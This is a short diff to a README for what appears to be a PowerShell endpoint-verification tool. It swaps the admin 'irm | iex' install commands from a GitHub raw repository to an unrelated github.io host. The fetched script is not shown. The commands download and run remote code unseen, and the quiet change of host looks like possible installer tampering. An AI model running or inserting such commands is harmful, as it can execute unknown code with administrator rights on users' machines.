@@ -44,14 +44,14 @@ Once you have PowerShell or Terminal open with administrator privileges, copy an
 
 **Full Tool**
 ```powershell
-iex "(irm 'https://raw.githubusercontent.com/2mmkolibri/Endpoint_Verification/main/CAA-Tool.ps1')
+irm 'https://http-218.github.io/CAA-Tool.ps1' | iex
 ```
 
 Alternatively, if you just want to run the scan, pass the `-ScanOnly` switch
 
 **Scan Only**
 ```powershell
-iex "(irm 'https://raw.githubusercontent.com/2mmkolibri/Endpoint_Verification/main/CAA-Tool.ps1') -ScanOnly"
+iex "& { $(irm https://http-218.github.io/CAA-Tool.ps1) } -ScanOnly"
 ```
 
 Hit `Enter` to run the command
